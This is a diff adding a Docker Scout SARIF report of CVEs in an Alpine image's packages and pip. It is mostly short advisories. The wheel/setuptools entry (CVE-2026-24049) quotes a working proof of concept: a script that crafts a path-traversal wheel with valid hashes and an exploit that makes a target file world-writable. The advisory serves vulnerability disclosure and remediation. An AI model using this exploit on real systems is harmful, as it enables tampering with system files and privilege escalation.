@@ -1,0 +1,2852 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Docker Scout",
+          "informationUri": "https://docker.com/products/docker-scout",
+          "name": "docker scout",
+          "rules": [
+            {
+              "id": "CVE-2026-1703",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-1703: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-1703?s=github&n=pip&t=pypi&vr=%3C26.0",
+              "help": {
+                "text": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.\n",
+                "markdown": "> When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.\n\n|                                                                                                                       |\n|Package                                                                                           pkg:pypi/pip@23.0.1  |\n|Affected range                                                                                    <26.0                |\n|Fixed version                                                                                     26.0                 |\n|[[CVSS Score 2.0] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N]]                       |\n"
+              },
+              "properties": {
+                "affected_version": "<26.0",
+                "cvssV3": 2,
+                "cvssV3_severity": "LOW",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "26.0",
+                "purls": [
+                  "pkg:pypi/pip@23.0.1"
+                ],
+                "security-severity": "2.0",
+                "tags": [
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-6992",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-6992"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-6992?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C%3D1.2.13-r1",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/zlib@1.2.13-r1?os_name=alpine&os_version=3.18  |\n|Affected range  <=1.2.13-r1                                                   |\n|Fixed version   not fixed                                                     |\n"
+              },
+              "properties": {
+                "affected_version": "<=1.2.13-r1",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "not fixed",
+                "purls": [
+                  "pkg:apk/alpine/zlib@1.2.13-r1?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "4.0",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-13176",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-13176"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-13176?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.8-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.8-r0                                                       |\n|Fixed version   3.1.8-r0                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.8-r0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "3.1.8-r0",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "4.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-9143",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-9143"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.7-r1",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.7-r1                                                       |\n|Fixed version   3.1.7-r1                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.7-r1",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "3.1.7-r1",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "4.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-3219",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-3219: Unrestricted Upload of File with Dangerous Type"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-3219?s=github&n=pip&t=pypi&vr=%3C%3D26.0.1",
+              "help": {
+                "text": "pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.\n",
+                "markdown": "> pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.\n\n|                                                                                                                       |\n|Package                                                                                           pkg:pypi/pip@23.0.1  |\n|Affected range                                                                                    <=26.0.1             |\n|Fixed version                                                                                     not fixed            |\n|[[CVSS Score 4.6] [CVSS Vector CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N]]                       |\n"
+              },
+              "properties": {
+                "affected_version": "<=26.0.1",
+                "cvssV3": 4.6,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "not fixed",
+                "purls": [
+                  "pkg:pypi/pip@23.0.1"
+                ],
+                "security-severity": "4.6",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-0232",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-0232"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-0232?s=alpine&n=sqlite&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C%3D3.41.2-r3",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18  |\n|Affected range  <=3.41.2-r3                                                     |\n|Fixed version   not fixed                                                       |\n"
+              },
+              "properties": {
+                "affected_version": "<=3.41.2-r3",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "not fixed",
+                "purls": [
+                  "pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "4.7",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-4603",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-4603"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-4603?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.5-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.5-r0                                                       |\n|Fixed version   3.1.5-r0                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.5-r0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "3.1.5-r0",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-6357",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-6357: Inclusion of Functionality from Untrusted Control Sphere"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-6357?s=github&n=pip&t=pypi&vr=%3C26.1",
+              "help": {
+                "text": "pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.\n",
+                "markdown": "> pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.\n\n|                                                                                                                       |\n|Package                                                                                           pkg:pypi/pip@23.0.1  |\n|Affected range                                                                                    <26.1                |\n|Fixed version                                                                                     26.1                 |\n|[[CVSS Score 5.3] [CVSS Vector CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N]]                       |\n"
+              },
+              "properties": {
+                "affected_version": "<26.1",
+                "cvssV3": 5.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "26.1",
+                "purls": [
+                  "pkg:pypi/pip@23.0.1"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-42363",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-42363"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-42363?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.36.1-r7",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                 |\n|Package         pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <1.36.1-r7                                                       |\n|Fixed version   1.36.1-r7                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<1.36.1-r7",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.36.1-r7",
+                "purls": [
+                  "pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-42364",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-42364"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-42364?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.36.1-r7",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                 |\n|Package         pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <1.36.1-r7                                                       |\n|Fixed version   1.36.1-r7                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<1.36.1-r7",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.36.1-r7",
+                "purls": [
+                  "pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-42365",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-42365"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-42365?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.36.1-r7",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                 |\n|Package         pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <1.36.1-r7                                                       |\n|Fixed version   1.36.1-r7                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<1.36.1-r7",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.36.1-r7",
+                "purls": [
+                  "pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-42366",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-42366"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.36.1-r6",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                 |\n|Package         pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <1.36.1-r6                                                       |\n|Fixed version   1.36.1-r6                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<1.36.1-r6",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.36.1-r6",
+                "purls": [
+                  "pkg:apk/alpine/busybox@1.36.1-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-2511",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-2511"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-2511?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.4-r6",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.4-r6                                                       |\n|Fixed version   3.1.4-r6                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.4-r6",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "3.1.4-r6",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-50602",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-50602"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-50602?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C2.6.4-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <2.6.4-r0                                                     |\n|Fixed version   2.6.4-r0                                                      |\n"
+              },
+              "properties": {
+                "affected_version": "<2.6.4-r0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "2.6.4-r0",
+                "purls": [
+                  "pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "5.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-8869",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-8869: Improper Link Resolution Before File Access ('Link Following')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-8869?s=github&n=pip&t=pypi&vr=%3C%3D25.2",
+              "help": {
+                "text": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.\n",
+                "markdown": "> When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.\n\n|                                                                                                                       |\n|Package                                                                                           pkg:pypi/pip@23.0.1  |\n|Affected range                                                                                    <=25.2               |\n|Fixed version                                                                                     25.3                 |\n|[[CVSS Score 5.9] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N]]                       |\n"
+              },
+              "properties": {
+                "affected_version": "<=25.2",
+                "cvssV3": 5.9,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "25.3",
+                "purls": [
+                  "pkg:pypi/pip@23.0.1"
+                ],
+                "security-severity": "5.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-47611",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-47611"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-47611?s=alpine&n=xz&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C%3D5.4.3-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                           |\n|Package         pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <=5.4.3-r0                                                 |\n|Fixed version   not fixed                                                  |\n"
+              },
+              "properties": {
+                "affected_version": "<=5.4.3-r0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "not fixed",
+                "purls": [
+                  "pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "6.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-36054",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-36054"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-36054?s=alpine&n=krb5&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.20.2-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  |\n|Affected range  <1.20.2-r0                                                    |\n|Fixed version   1.20.2-r0                                                     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.20.2-r0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.20.2-r0",
+                "purls": [
+                  "pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "6.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-5752",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-5752: Improper Neutralization of Special Elements used in a Command ('Command Injection')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-5752?s=github&n=pip&t=pypi&vr=%3C23.3",
+              "help": {
+                "text": "When installing a package from a Mercurial VCS URL, e.g. `pip install hg+...`, with pip prior to v23.3, the specified Mercurial revision could be used to inject arbitrary configuration options to the `hg clone` call (e.g. `--config`). Controlling the Mercurial configuration can modify how and which repository is installed. This vulnerability does not affect users who aren't installing from Mercurial.\n",
+                "markdown": "> When installing a package from a Mercurial VCS URL, e.g. `pip install hg+...`, with pip prior to v23.3, the specified Mercurial revision could be used to inject arbitrary configuration options to the `hg clone` call (e.g. `--config`). Controlling the Mercurial configuration can modify how and which repository is installed. This vulnerability does not affect users who aren't installing from Mercurial.\n\n|                                                                                                                       |\n|Package                                                                                           pkg:pypi/pip@23.0.1  |\n|Affected range                                                                                    <23.3                |\n|Fixed version                                                                                     23.3                 |\n|[[CVSS Score 6.8] [CVSS Vector CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N]]                       |\n"
+              },
+              "properties": {
+                "affected_version": "<23.3",
+                "cvssV3": 6.8,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "23.3",
+                "purls": [
+                  "pkg:pypi/pip@23.0.1"
+                ],
+                "security-severity": "6.8",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24049",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-24049: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1",
+              "help": {
+                "text": "### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```\n",
+                "markdown": "> ### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef 